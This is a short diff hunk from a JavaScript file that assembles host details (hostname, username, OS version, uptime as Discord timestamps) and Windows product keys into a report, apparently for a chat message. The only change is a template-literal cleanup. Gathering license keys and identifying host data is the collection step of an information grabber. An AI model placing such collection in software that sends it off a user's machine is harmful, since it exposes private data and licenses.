@@ -18,7 +18,7 @@ const json = async () => {
     ['RAM', filesize(Math.round(os.totalmem()))],
     ['Name', os.hostname()],
     ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
-    ['Username', `${os.userInfo().username}`],
+    ['Username', os.userInfo().username],
     ['OS version', os.version()],
     ['Product Key', `\`\`${require('./product-key').productKey}\`\``],
     ['Backup Product Key', `\`\`${require('./product-key').backupProductKey}\`\``],
